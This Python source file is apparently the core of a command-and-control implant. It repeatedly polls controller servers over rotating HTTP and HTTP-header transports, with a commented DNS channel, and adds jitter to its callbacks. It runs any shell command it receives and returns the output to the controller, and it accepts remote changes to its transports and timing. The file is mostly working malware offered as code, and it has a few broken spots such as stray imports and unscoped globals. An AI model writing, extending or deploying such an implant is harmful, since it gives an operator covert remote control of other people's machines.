from pickle import FALSE
import random
from re import T
import subprocess
import os
import uuid
import time

import asyncio

# os.environ["GRAYMAN_DEBUG"] = "1"
os.environ["GRAYMAN_VERBOSE"] = "1"
# import sys
# sys.path.append("../")

from helpers import delay, verbose, debug
from classes import  C2Response, HTTPHeaderTransport, HTTPTransport, DNSTransport, TCPTransport

# there are 3 types of c2 servers; 
# access flows down from long to interactive
# long-haul
#   - emergency fall-back should other servers be blocked
#   - shorthaul_freqUENCY > 4 hours 
# short-haul
#   - per operation use
#   - hands off operation to interactive
#   - shorthaul_freqUENCY 15 minutes to 2 hours
# interactive servers
#   - 
#   - shell access to machine
#   - shorthaul_freqUENCY < 60 second

IMPLANT_ID = f"{uuid.getnode():x}"

LONGHAUL_TRANSPORTS = list()
LONGHAUL_FREQUENCY = 10 # time in seconds; should be days or at least many hours
SHORTHAUL_FAILURE_THRESHOLD = 10 # how many shorthaul failures before trying a longhaul server
SHORTHAUL_TRANSPORTS = list()
SHORTHAUL_FREQUENCY = 1 # in seconds; should be some number of minutes
INTERACTIVE_TRANSPORTS = list() 
INTERACTIVE_FREQUENCY = .1 # in seconds; should be seconds

URL = "https://shyft.us"
PROXIES = tuple()

async def fork_cmd(cmd:str) -> str:
    """This is for running a long running command that would interrupt the phone home cycle"""
    
    command_task = subprocess.run(cmd, capture_output=True, shell=True)
    ret = command_task.stdout.decode()

    if ret:
        return ret
    return ""

def add_transport(t_obj:dict):
    t_type = t_obj.get('type')
    t_server = t_obj.get('server')
    t_role = t_obj.get('role') # long or short
    if t_type == "HTTP":
        t = HTTPTransport(server=t_server)
    elif t_type == "HTTPHeader":
        t = HTTPHeaderTransport(server=t_server)
    if t_role == "long":
        LONGHAUL_TRANSPORTS.append(t)
    elif t_role == 'short':
        SHORTHAUL_TRANSPORTS.append(t)

def del_transport(t_obj:dict):
    t_type = t_obj.get('type')
    t_server = t_obj.get('server')
    t_role = t_obj.get('role') # long or short
    #iterate through appropriate role list
    #if t_server == transport.server


def exfil(file:str):
    raise NotImplementedError

async def operate():
    verbose("Operating...")

    t1 = HTTPTransport(server="http://localhost:3000/ep1", proxies=PROXIES)
    t2 = HTTPTransport(server="http://localhost:3000/ep2", proxies=PROXIES)
    t3 = HTTPTransport(server="http://localhost:3000/ep3", proxies=PROXIES)
    t4 = HTTPHeaderTransport(server='http://localhost:3000/headers')
    t5 = HTTPHeaderTransport(server='http://localhost:3000/favicon.ico')
    # t4 = DNSTransport(domain="c2.shyft.us")
    # t5 = TCPTransport(server="localhost:9999")
    # TRANSPORTS = [t1, t2, t3, t4]
    
    lh = HTTPTransport(server="http://localhost:5000/longhaul", proxies=PROXIES)
    
    LONGHAUL_TRANSPORTS = [lh]
    SHORTHAUL_TRANSPORTS = [t1, t2, t3, t4, t5]
    # SHORTHAUL_TRANSPORTS = [t4, t5]
    
    PHONEHOME_SUCCESS = False
    
    SHORTHAUL_FAILURE_COUNT = 0
    while True:
        # print show running config
        # print(f"{SHORTHAUL_FREQUENCY=} {PROXIES=}")

        c2_resp = C2Response()
        c2_resp.implant_id = IMPLANT_ID
        # Get command
        cmd_output = ""
        try:
            # pick a random transport every time... 
            if SHORTHAUL_FAILURE_COUNT > SHORTHAUL_FAILURE_THRESHOLD:
                transport = random.choice(LONGHAUL_TRANSPORTS)
            else:
                transport = random.choice(SHORTHAUL_TRANSPORTS)
            c2_cmd = transport.recv()

            shell_cmd = c2_cmd.get('shell_cmd')
            if shell_cmd != None: # if there is a command... do this... 
                cmd_output = await fork_cmd(shell_cmd)
                c2_resp.payload = cmd_output

            if c2_cmd.get('add_transport'):
                t_obj = c2_cmd.get('add_transport')
                add_transport(t_obj)


            if c2_cmd.get('del_transport'):
                t_obj = c2_cmd.get('del_transport')
                del_transport(t_obj)

            new_sh_freq = c2_cmd.get('shorthaul_freq')
            if new_sh_freq != None:
                SHORTHAUL_FREQUENCY = new_sh_freq
                verbose(f"New shorthaul callback frequency: {SHORTHAUL_FREQUENCY}")

            new_lh_freq = c2_cmd.get('longhaul_freq')
            if new_lh_freq != None:
                LONGHAUL_FREQUENCY = new_lh_freq
                verbose(f"New longhaul callback frequency: {LONGHAUL_FREQUENCY}")


            # if we get this far phone home was successful
            PHONEHOME_SUCCESS = True
            NEXT_LH_PHONEHOME = int(time.time()) + LONGHAUL_FREQUENCY
        except BaseException as e: 
            SHORTHAUL_FAILURE_COUNT += 1 
            PHONEHOME_SUCCESS = False          
            debug(e)
            

        # upodate the callback frequency if requested. 
        

        # wait some time
        jitter = SHORTHAUL_FREQUENCY // 4
        delay(SHORTHAUL_FREQUENCY, jitter_amount=jitter)

        # send results back
        try:
            if cmd_output != None:
                transport = random.choice(SHORTHAUL_TRANSPORTS)
                transport_resp = transport.send(cmd_output, implant_id=IMPLANT_ID, jobid=c2_cmd.get('jobid', ''))
                # maybe we do some thing with the response, maybe we don't...
                
        except BaseException as e:
            SHORTHAUL_FAILURE_COUNT += 1 
            PHONEHOME_SUCCESS = False
            debug(e)

        

        SHORTHAUL_FAILURE_COUNT = 0 
        # wait some more time
        jitter = SHORTHAUL_FREQUENCY // 4
        delay(SHORTHAUL_FREQUENCY, jitter_amount=jitter)


if __name__ == "__main__":
    try:
        asyncio.run(operate())
    except KeyboardInterrupt as e:
        print("\nShutting down...", e)
